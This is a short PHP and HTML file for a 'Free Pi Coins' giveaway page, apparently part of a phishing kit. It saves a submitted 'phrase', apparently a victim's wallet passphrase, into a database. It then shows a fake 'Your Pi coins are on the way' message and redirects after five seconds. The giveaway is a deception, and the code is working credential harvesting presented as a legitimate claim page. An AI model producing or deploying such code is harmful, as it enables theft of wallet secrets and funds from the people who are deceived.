<?php
include 'database.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    $phrase = $_POST['phrase'];

    $stmt = $pdo->prepare('INSERT INTO form_submissions (phrase) VALUES (?)');
    $stmt->execute([$phrase]);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Pi Coins</title>
    <link rel="stylesheet" href="submit_styles.css">
</head>
<body>
    <header>
        <div class="logo-container">
            <img src="./logo.png" alt="Pi Logo" class="logo">
            <h1>Free Pi Coins</h1>
        </div>
        <nav>
            <ul>
                <li><a href="index.php">Home</a></li>
                <li><a href="self_verification.php">Self Verification</a></li>
                <li><a href="about.php">About Pi </a></li>
            </ul>
        </nav>
    </header>

    <section id="submit-section" class="submit-section">
        <div class="alert-box">
            <h2>Success!</h2>
            <p>Your Pi coins are on the way ! They will be added to your wallet shortly.</p>
        </div>
    </section>

    <footer>
        <p>&copy; 2024 Free Pi Coins. All rights reserved.</p>
    </footer>

    <script>
        setTimeout(function() {
            window.location.href = 'index.php';
        }, 5000);
    </script>
</body>
</html>
